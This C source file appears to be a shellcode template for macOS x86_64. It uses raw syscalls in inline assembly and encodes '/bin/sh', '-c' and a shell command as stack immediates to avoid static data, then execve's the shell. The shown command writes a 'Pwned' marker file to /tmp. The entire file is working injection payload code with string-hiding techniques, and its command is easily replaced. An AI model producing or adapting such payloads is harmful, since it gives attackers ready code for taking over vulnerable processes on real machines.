/* shellcode.c — position-independent, syscall-only C shellcode for macOS x86_64 */
typedef unsigned long u64;

#define SYS_write   0x2000004UL /* (SYSCALL_CLASS_UNIX << 24) | 4  */
#define SYS_execve  0x200003BUL /* (SYSCALL_CLASS_UNIX << 24) | 59 */
#define SYS_exit    0x2000001UL /* (SYSCALL_CLASS_UNIX << 24) | 1  */

static u64 sc3(u64 n, u64 a, u64 b, u64 c)
{
    u64 ret;
    __asm__ __volatile__("syscall"
                         : "=a"(ret)
                         : "a"(n), "D"(a), "S"(b), "d"(c)
                         : "rcx", "r11", "memory");
    return ret;
}

int main(void)
{
    /* strings built from immediates on the stack — never a pointer into static data */
    volatile u64 s_sh = 0x0068732f6e69622fUL; /* "/bin/sh\0" */
    volatile u64 s_c  = 0x000000000000632dUL; /* "-c\0"      */

    /* "echo \"W00tW00t\" > /tmp/Pwned.txt\0" — 33 bytes, as 4 immediates + terminator */
    volatile char cmd[33];
    *(volatile u64 *)&cmd[0]  = 0x305722206f686365UL;
    *(volatile u64 *)&cmd[8]  = 0x2022743030577430UL;
    *(volatile u64 *)&cmd[16] = 0x502f706d742f203eUL;
    *(volatile u64 *)&cmd[24] = 0x7478742e64656e77UL;
    cmd[32] = 0;

    /* argv array on the stack — pointers to our stack strings, NULL-terminated */
    u64 argv[4];
    argv[0] = (u64)&s_sh;
    argv[1] = (u64)&s_c;
    argv[2] = (u64)cmd;
    argv[3] = 0;

    sc3(SYS_execve, (u64)&s_sh, (u64)argv, 0);
    sc3(SYS_exit, 0, 0, 0);
    __builtin_unreachable();
}
